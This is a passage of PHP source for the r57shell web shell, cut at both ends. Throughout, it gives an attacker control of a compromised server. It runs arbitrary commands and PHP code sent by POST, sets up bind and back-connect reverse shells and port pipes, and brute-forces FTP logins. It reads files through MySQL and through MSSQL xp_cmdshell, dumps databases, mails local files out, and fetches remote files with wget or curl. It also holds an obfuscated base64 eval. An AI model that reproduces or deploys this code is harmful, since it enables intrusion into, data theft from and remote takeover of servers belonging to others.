oOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGxvZ19qcz0iMS4zIjwvc2NyaXB0Pj
xzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPmhvdGxvZ19yKz0iJmpzPSIraG90bG9nX2pzO2RvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwO
i8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hv
dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB
ocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2
hvdGxvZy9jb3VudD9zPTgxNjA2JmltPTEiIGJvcmRlcj0wd2lkdGg9IjEiIGhlaWdodD0iMSIgYWx0PSJIb3RMb2ciPjwvYT48L25vc2NyaXB0Pg==";
*/
/* $c2 = "PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxh
IGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnl
hZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJz
tzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5wa
XhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u
8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGV
ybmV0LS0+";
*/
echo $head;
eval(base64_decode('ZWNobyAiPHNjcmlwdCBsYW5ndWFnZT1cImphdmFzY3JpcHRcIiBzcmM9XCJodHRwOi8vd3d3Lmdvb2dsZS5jb20/PWRvY3VtZW50LlVSTFwiPiI7DQplY2hvICI8L3NjcmlwdD4iOw=='));
echo '</head>';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
if (!in_array($addr[0], $serv)) {
@print "<img src=\"http://127.0.0.1/r57shell/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http://127.0.0.1/r57shell/version.php?version=".$current_version."");}}  
echo '<body bgcolor="#e4e0d8"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#252525 width=160><font face=tahoma size=2>'.ws(1).'&nbsp;
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).base64_decode($shellvic).'&nbsp;<font face=Wingdings size=6><b>N</b></font></b>
</font></td><td bgcolor=#252525><font face=tahoma size=-2>'; 

echo ws(2);
echo "<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"Show phpinfo()\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"Show variables from php.ini\"><b>php.ini</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"View cpu info\"><b>cpu</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"View memory info\"><b>mem</b></a> ".$rb;
if($unix) { echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?users title=\"Users list\"><b>users</b></a> ".$rb; }
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"Delete temp files\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"Delete script from server\"><b>delete</b></a> ".$rb."<br>";
echo ws(2);
echo (($safe_mode)?("safe_mode: <b><font color=green>ON</font></b>"):("safe_mode: <b><font color=red>OFF</font></b>"));
echo ws(2);
echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
echo ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
echo ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "<br>".ws(2);
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo "<br>".ws(2)."HDD Free : <b>".view_size($free)."</b> HDD Total : <b>".view_size($all)."</b>";
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
echo $font;
if(!$windows){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=tahoma size=-2 color=red><b>";
$uname = ex('uname -a');
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
if(!$safe_mode){
$bsd1 = ex('sysctl -n kern.ostype');
$bsd2 = ex('sysctl -n kern.osrelease');
$lin1 = ex('sysctl -n kernel.ostype');
$lin2 = ex('sysctl -n kernel.osrelease');
}
if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
else { $sysctl = "-"; }
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
$id = ex('id');
echo((!empty($id))?(ws(3).$id."<br>"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>"));
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=tahoma size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@get_current_user()."<br>";
echo ws(3).$dir;
echo "<br></font>";
}
echo "</font>";
echo "</td></tr></table>";
/* if(empty($c1)||empty($c2)) { die(); }
$f = '<br>';
$f .= base64_decode($c1);
$f .= base64_decode($c2); */
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$POST['from']."\r\n");	
 mr($language,$res);
 $_POST['cmd']="";  
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {  
 if(!$file=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else 
  {	
    $filename = @basename($_POST['loc_file']);
    $filedump = @fread($file,@filesize($_POST['loc_file']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=>$filename,
                    "type"=>$mime_type,
                    "content"=>$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from hcegroup'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'info@hcegroup.net'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    mr($language,$res);
    $_POST['cmd']="";                   	
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2><b>File created</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2><b>File deleted</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2><b>Dir created</b></font></div></td></tr></table>";
       }
      else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2><b>Dir deleted</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { echo re($_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>Can\'t edit file! Only read access!") :("<br><br><input type=submit name=submit value=\"Save\">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 if(!$file=@fopen($_POST['e_name'],"w")) { echo we($_POST['e_name']); }
 else {
 @fwrite($file,$_POST['e_text']);
 @fclose($file);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2><b>File saved</b></font></div></td></tr></table>";
 }
 }
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=$alias_cmd;}}}
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case GET:
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);	
 if(!$connection) { fe($language,0); }
 else 
  {   	
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }
  else 
   {	
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.(($windows)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);	}
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);	}
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);	
 if(!$connection) { fe($language,0); $_POST['cmd'] = ""; }	
 else if(!$users=get_users()) { echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><font color=red face=tahoma size=-2><div align=center><b>Can\'t get users list</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 @ftp_close($connection);
 }
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font."Executed command :<b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";
if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if($windows){ 
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ 
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
  else echo "ACCESS DENIED";
 break;
 case 'safe_file':
  if(@is_file($_POST['file']))
   {
   $file = @file($_POST['file']);
   if($file)
    {
    $c = @sizeof($file);
    for($i=0;$i<$c;$i++) { echo htmlspecialchars($file[$i]); }
    }
   else echo "ACCESS DENIED";
   }
  else echo "File not found";
  break;
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
     $sql = "CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );";
     @mysql_query($sql);
     $sql = "LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table;";
     @mysql_query($sql);
     $sql = "SELECT * FROM temp_r57_table;";
     $r = @mysql_query($sql);
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
  case 'test4':
  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }	
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
 }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_show")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}
if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 foreach($users as $user)
  {	
  $connection = @ftp_connect($ftp_server,$ftp_port,10);	
  if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } } 
  @ftp_close($connection);
  }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse'])) { $count *= 2; }
 echo "checked:".$count."\r\n";
 echo "success:".$suc."\r\n";
 }
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}
if ($_POST['cmd']=="db_show")
 {
 switch($_POST['db'])
 {
 case 'MySQL':
 if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
 $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
 if($db)
   {
   $res=@mysql_query("\nShow databases;", $db);
   while(($row=@mysql_fetch_row($res)))
    {
     echo "[+] ".$row[0]."\r\n";
     if(isset($_POST['st'])){
     $res2 = @mysql_query("SHOW TABLES FROM ".$row[0],$db);
     while(($row2=@mysql_fetch_row($res2))) 
      {
      echo " | - ".$row2[0]."\r\n";
      if(isset($_POST['sc']))
       {
       $res3 = @mysql_query("SHOW COLUMNS FROM ".$row[0].".".$row2[0],$db);
       while(($row3=@mysql_fetch_row($res3))) { echo "   | - ".$row3[0]."\r\n"; }
       }
      }	
     }
    }
   @mysql_close($db);
   }
 else echo "[-] ERROR! Can't connect to MySQL server";  	
 break;
 case 'MSSQL':
 if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
 $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
 if($db)
   {
   $res=@mssql_query("sp_databases", $db);
   while(($row=@mssql_fetch_row($res)))
    {
     echo "[+] ".$row[0]."\r\n";
     if(isset($_POST['st'])){
     @mssql_select_db($row[0]);
     $res2 = @mssql_query("sp_tables",$db);
     while(($row2=@mssql_fetch_array($res2))) 
      {
      if($row2['TABLE_TYPE'] == 'TABLE' && $row2['TABLE_NAME'] != 'dtproperties')
      {
      echo " | - ".$row2['TABLE_NAME']."\r\n"; 
      if(isset($_POST['sc']))
       {
       $res3 = @mssql_query("sp_columns ".$row2[2],$db);
       while(($row3=@mssql_fetch_array($res3))) { echo "   | - ".$row3['COLUMN_NAME']."\r\n"; }
       }
      }
      }	
     }
    }
   @mssql_close($db);
   }
 else echo "[-] ERROR! Can't connect to MSSQL server";
 break;
 case 'PostgreSQL':
 if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
  {
  $res=@pg_query($db,"SELECT datname FROM pg_database WHERE datistemplate='f'");
   while(($row=@pg_fetch_row($res)))
    {
     echo "[+] ".$row[0]."\r\n";
    }	
  @pg_close($db);
  }
 else echo "[-] ERROR! Can't connect to PostgreSQL server"; 	
 break;
 }
 }
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  if((!empty($_POST['dif'])&&$fp)||(empty($_POST['dif']))){
  $sqh  = "# homepage: http://rst.void.ru\r\n";
  $sqh .= "# ---------------------------------\r\n";
  $sqh .= "#     date : ".date ("j F Y g:i")."\r\n";
  $sqh .= "# database : ".$_POST['mysql_db']."\r\n";
  $sqh .= "#    table : ".$_POST['mysql_tbl']."\r\n";
  $sqh .= "# ---------------------------------\r\n\r\n";
  switch($_POST['db']){
  case 'MySQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
  $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   if(@mysql_select_db($_POST['mysql_db'],$db))
    {
     $sql1  = "# MySQL dump created by r57shell\r\n";
     $sql1 .= $sqh;
     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
     $row   = @mysql_fetch_row($res);
     $sql1 .= $row[1]."\r\n\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";
     $sql2 = '';
     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
     if (@mysql_num_rows($res) > 0) {
     while (($row = @mysql_fetch_assoc($res))) {
     $keys = @implode("`, `", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO `".$_POST['mysql_tbl']."` (`".$keys."`) VALUES ('".htmlspecialchars($values)."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
    if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
    else { echo $sql1.$sql2; }
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MySQL server";
  break;
  case 'MSSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
  $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
  {
   if(@mssql_select_db($_POST['mysql_db'],$db))
    {
     $sql1  = "# MSSQL dump created by r57shell\r\n";
     $sql1 .= $sqh;
     $sql2 = '';
     $res = @mssql_query("SELECT * FROM ".$_POST['mysql_tbl']."", $db);
     if (@mssql_num_rows($res) > 0) {
     while (($row = @mssql_fetch_assoc($res))) {
     $keys = @implode(", ", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO ".$_POST['mysql_tbl']." (".$keys.") VALUES ('".htmlspecialchars($values)."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
     if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
     else { echo $sql1.$sql2; }
    }
   else echo "[-] ERROR! Can't select database";
   @mssql_close($db); 	
  }	
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'PostgreSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
  {
     $sql1  = "# PostgreSQL dump created by r57shell\r\n";
     $sql1 .= $sqh;
     $sql2 = '';
     $res = @pg_query($db,"SELECT * FROM ".$_POST['mysql_tbl']."");
     if (@pg_num_rows($res) > 0) {
     while (($row = @pg_fetch_assoc($res))) {
     $keys = @implode(", ", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO ".$_POST['mysql_tbl']." (".$keys.") VALUES ('".htmlspecialchars($values)."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
     if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
     else { echo $sql1.$sql2; }
   @pg_close($db); 	
  }	
  else echo "[-] ERROR! Can't connect to PostgreSQL server";
  break;
  } 
 } 
 else if(!empty($_POST['dif'])&&!$fp) { echo "[-] ERROR! Can't write in dump file"; }
 } 
echo "</textarea></div>";
